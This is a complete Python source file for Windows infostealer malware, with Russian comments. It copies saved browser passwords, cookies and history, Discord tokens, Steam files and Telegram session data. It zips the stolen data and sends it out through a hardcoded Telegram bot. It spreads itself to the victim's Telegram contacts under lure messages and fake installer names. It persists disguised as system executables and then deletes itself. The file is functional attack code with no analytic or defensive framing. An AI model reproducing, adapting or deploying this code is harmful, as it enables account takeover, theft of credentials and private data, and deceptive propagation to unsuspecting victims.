# -*- coding: utf-8 -*-
import os, sys, json, base64, shutil, sqlite3, zipfile, requests, subprocess, time, winreg, random, glob, ctypes, re
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8673865814:AAG-THNHkDMSe3eNijgujhX3LMXeYYNOfzE"
ADMIN_IDS = [8790926224, 7121134347]

# 20 вариантов сообщений и соответствующих имён файлов
SPREAD_VARIANTS = [
    ("Смотри какой полезный софт", "HelpDesk.exe"),
    ("Установи обязательно", "Setup_v2.exe"),
    ("Топ программа 2025", "TopApp2025.exe"),
    ("Срочно установи", "CriticalUpdate.exe"),
    ("Новинка от Microsoft", "WindowsUpdate.exe"),
    ("Лучший антивирус", "AntivirusSetup.exe"),
    ("Игра месяца", "GameLauncher.exe"),
    ("Драйвера обнови", "DriverBooster.exe"),
    ("Кэшбэк приложение", "CashbackApp.exe"),
    ("Заработай легко", "EasyMoney.exe"),
    ("Важное обновление", "SecurityPatch.exe"),
    ("Секретный файл", "Confidential.exe"),
    ("Фото от друга", "PhotoGallery.exe"),
    ("Музыка бесплатно", "MusicPlayer.exe"),
    ("VPN для всего", "FastVPN.exe"),
    ("Оптимизатор ПК", "PCCleaner.exe"),
    ("Архиватор новый", "WinRAR2025.exe"),
    ("Торрент клиент", "TorrentPro.exe"),
    ("Офисный пакет", "OfficeSetup.exe"),
    ("Бэкап системы", "BackupTool.exe")
]

def send_to_admin(filename, data_bytes):
    for uid in ADMIN_IDS:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            requests.post(url, files={'document': (filename, data_bytes)}, data={'chat_id': uid}, timeout=15)
        except: pass

def steal_browsers(out_dir):
    local, roaming = os.getenv('LOCALAPPDATA'), os.getenv('APPDATA')
    browsers = {
        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(local, 'Vivaldi', 'User Data')
    }
    for name, path in browsers.items():
        if not os.path.exists(path): continue
        profiles = ['Default']
        if os.path.exists(os.path.join(path, 'Local State')):
            try:
                with open(os.path.join(path, 'Local State')) as f:
                    ls = json.load(f)
                    profiles = ['Default'] + [p for p in ls.get('profile', {}).get('profiles_order', []) if p not in profiles]
            except: pass
        for profile in profiles:
            prof_path = os.path.join(path, profile)
            if not os.path.exists(prof_path): continue
            for db in ['Login Data', 'Cookies', 'History', 'Web Data']:
                src = os.path.join(prof_path, db) if 'Network' not in db else os.path.join(prof_path, 'Network', 'Cookies')
                if db == 'Cookies' and os.path.exists(os.path.join(prof_path, 'Network', 'Cookies')):
                    src = os.path.join(prof_path, 'Network', 'Cookies')
                if os.path.exists(src):
                    shutil.copy2(src, os.path.join(out_dir, f"{name}_{profile}_{db}.db"))
    # Firefox
    ff = os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(ff):
        for prof in os.listdir(ff):
            if 'default' in prof.lower():
                prof_path = os.path.join(ff, prof)
                for fn in ['logins.json', 'cookies.sqlite', 'places.sqlite', 'key4.db']:
                    src = os.path.join(prof_path, fn)
                    if os.path.exists(src):
                        shutil.copy2(src, os.path.join(out_dir, f"firefox_{fn}"))
                break

def steal_discord(out_dir):
    roaming = os.getenv('APPDATA')
    tokens = []
    for app in ['discord', 'discordcanary', 'discordptb']:
        path = os.path.join(roaming, app, 'Local Storage', 'leveldb')
        if os.path.exists(path):
            for f in os.listdir(path):
                if f.endswith(('.log', '.ldb')):
                    with open(os.path.join(path, f), 'r', errors='ignore') as fp:
                        data = fp.read()
                        tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data))
    if tokens:
        with open(os.path.join(out_dir, 'discord_tokens.txt'), 'w') as f:
            f.write('\n'.join(set(tokens)))

def steal_steam(out_dir):
    for drive in ['C:\\', 'D:\\']:
        for ssfn in glob.glob(drive + 'ssfn*'):
            shutil.copy2(ssfn, out_dir)
    paths = [r'C:\Program Files (x86)\Steam\config', r'C:\Program Files\Steam\config']
    for p in paths:
        if os.path.exists(p):
            shutil.copytree(p, os.path.join(out_dir, 'Steam_config'), dirs_exist_ok=True)

def steal_telegram_tdata(out_dir):
    tg = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
    if os.path.exists(tg):
        target = os.path.join(out_dir, 'tdata')
        shutil.copytree(tg, target, dirs_exist_ok=True)
        return target
    return None

def pack_and_send(folder):
    zip_path = os.path.join(os.environ['TEMP'], 'data.zip')
    shutil.make_archive(zip_path.replace('.zip', ''), 'zip', folder)
    with open(zip_path, 'rb') as f:
        send_to_admin('stolen_data.zip', f.read())
    os.remove(zip_path)

def stealth_spread(exe_path):
    tg_paths = [
        r"C:\Program Files\Telegram Desktop\Telegram.exe",
        r"C:\Program Files (x86)\Telegram Desktop\Telegram.exe",
        os.path.join(os.getenv('PROGRAMFILES', 'C:\\Program Files'), 'Telegram Desktop', 'Telegram.exe')
    ]
    tg_exe = next((p for p in tg_paths if os.path.exists(p)), None)
    if not tg_exe:
        return
    
    for msg, new_name in SPREAD_VARIANTS:
        temp_exe = os.path.join(os.environ['TEMP'], new_name)
        shutil.copy2(exe_path, temp_exe)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        subprocess.Popen([tg_exe, f'--sendpath={temp_exe}', f'--msg={msg}'], 
                         startupinfo=startupinfo, 
                         creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(0.7)
        try:
            os.remove(temp_exe)
        except:
            pass

def add_startup():
    exe = sys.executable if getattr(sys, 'frozen', False) else __file__
    sys_names = ['svchost.exe', 'explorer.exe', 'RuntimeBroker.exe', 'dllhost.exe', 'winlogon.exe']
    rand_name = random.choice(sys_names)
    dest = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', rand_name)
    if not os.path.exists(dest):
        shutil.copy2(exe, dest)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, rand_name.replace('.exe', ''), 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)
    except: pass

def self_destruct():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        for val in ['svchost', 'explorer', 'RuntimeBroker', 'dllhost', 'winlogon']:
            try:
                winreg.DeleteValue(key, val)
            except: pass
        winreg.CloseKey(key)
    except: pass
    startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    for sys_name in ['svchost.exe', 'explorer.exe', 'RuntimeBroker.exe', 'dllhost.exe', 'winlogon.exe']:
        p = os.path.join(startup_dir, sys_name)
        if os.path.exists(p):
            os.remove(p)
    bat = os.path.join(os.environ['TEMP'], 'wipe.bat')
    with open(bat, 'w') as f:
        f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{sys.executable}"\ndel /f /q "{bat}"\nexit')
    subprocess.Popen(bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit(0)

def main():
    work_dir = os.path.join(os.environ['TEMP'], 'sys_' + str(random.randint(1000, 9999)))
    if os.path.exists(work_dir):
        self_destruct()
        return
    os.makedirs(work_dir)
    add_startup()
    current = sys.executable if getattr(sys, 'frozen', False) else __file__
    working = os.path.join(work_dir, 'core.exe')
    shutil.copy2(current, working)
    stolen = os.path.join(work_dir, 'stolen')
    os.makedirs(stolen)
    steal_browsers(stolen)
    steal_discord(stolen)
    steal_steam(stolen)
    steal_telegram_tdata(stolen)
    pack_and_send(stolen)
    stealth_spread(working)
    shutil.rmtree(work_dir, ignore_errors=True)
    self_destruct()

if __name__ == "__main__":
    main()
